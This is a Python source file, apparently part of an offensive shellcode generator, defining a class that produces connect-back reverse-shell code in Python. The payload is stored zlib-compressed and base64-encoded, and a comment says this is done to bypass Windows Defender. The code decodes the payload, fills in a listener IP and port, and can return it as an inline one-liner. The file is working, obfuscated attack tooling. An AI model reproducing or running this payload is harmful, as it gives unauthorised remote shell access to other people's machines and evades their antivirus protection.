import zlib
import base64
from .base import ShellCode


class PythonShellCode(ShellCode):
    """
        Class with shellcodes for python language
    """

    def __init__(self, connect_back_ip='localhost', connect_back_port=5555):
        ShellCode.__init__(self, connect_back_ip=connect_back_ip,
                           connect_back_port=connect_back_port)

    def get_python_code(self, bad_chars):
        """
            Function to get python shellcode
        """

        if not self.connect_back_ip or not self.connect_back_port:
            print("Settings for connect back listener must be defined")
            return False

        # compress and base64 encode to bypass windows defender
        python_code = (
            b'eJxtUsFu2zAMvfsrWORgezOctdhpQA5BkGHFuiZofBuGQLY4'
            b'WKgteZKcoijy7yUlNzOK6mLz8fHpkeLiajk6u6yVXg7PvjU6'
            b'Uf1grAdnmkf0hRvrwZoGnUt+7A4VrCB9ebnbbdZ3HJ7PKdBZ'
            b'QNUiWOyNR2iN88l+98DcicrR+Qzwn+tEjxDuEQ5GhxLqZ/Cc'
            b'QHtCmzgqjg7K+MmmaP39eHu/rYq37GG3+Xk8VA/b9a88WUBj'
            b'tMbGgzcgvBdEsdCLplUaE1dO2Sxj7wWwrZyrHGoJTwjC4psC'
            b'SuIznqW/P/2BTUSV0bB1XtSdci3KqzRUe0F9dMYMyVOrOoTr'
            b'b0ns1GKj8ERNtdh1pNz3QsuQk8ILbrEkyim7/nLzNQ/4YJX2'
            b'ITtJqL+gvIN/o/IFD0hDbVE8ghlpdOS66YzDaRihhAqiOL0U'
            b'V6Vg7AxJozc+QWi6RpoPTPLDs8nLCpR7M6DOWK2I/FVlR6R/'
            b'L8nQas683W8DjtZ+iCv9Hs4vUxOS+xvG2FEUP55ENyLZ4ZIy'
            b'YiVTsxw+X0C6bQInsfC0UWy+FFE4PvBcP+zQfKS0NByS3itr'
            b'QQTj'
        )
        python_code = zlib.decompress(base64.b64decode(python_code)).decode()
        python_code = self.format_shellcode(python_code)
        return python_code

    def get_shellcode(self, inline=False):
        shell = self.get_python_code(self.bad_chars)
        if inline:
            shell = self.make_inline(shell)
        return shell
